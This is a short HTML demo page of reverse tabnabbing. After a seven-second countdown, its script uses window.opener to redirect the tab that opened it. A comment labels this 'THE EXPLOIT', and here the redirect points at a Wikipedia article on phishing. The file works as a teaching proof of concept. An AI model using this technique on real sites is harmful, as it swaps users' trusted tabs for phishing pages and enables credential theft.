<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Link Launcher</title>
    <style>
        body { 
            font-family: sans-serif; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #f8f9fa; 
        }
        .container { text-align: center; }
        #timer { margin-top: 20px; color: #d9534f; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="container">
        <h1>External Resource Loaded</h1>
        <p>The original tab will be redirected shortly...</p>
        <div id="timer">Redirecting original tab in: 7s</div>
    </div>

    <script>
        let secondsLeft = 7;
        const timerElement = document.getElementById('timer');

        // 1. Create a countdown visual (Optional, just for the demo)
        const countdown = setInterval(() => {
            secondsLeft--;
            timerElement.innerText = `Redirecting original tab in: ${secondsLeft}s`;
            if (secondsLeft <= 0) clearInterval(countdown);
        }, 1000);

        // 2. THE EXPLOIT: Execute the redirect after 7000ms (7 seconds)
        setTimeout(function() {
            if (window.opener) {
                try {
                    // Redirect the original tab to the fake page
                    window.opener.location = "https://en.wikipedia.org/wiki/Phishing";
                    timerElement.innerText = "Original tab redirected!";
                    timerElement.style.color = "green";
                } catch (e) {
                    timerElement.innerText = "Redirect failed. Browser blocked access.";
                }
            } else {
                timerElement.innerText = "No 'opener' detected (Modern browser protection active).";
            }
        }, 7000); 
    </script>

</body>
</html>
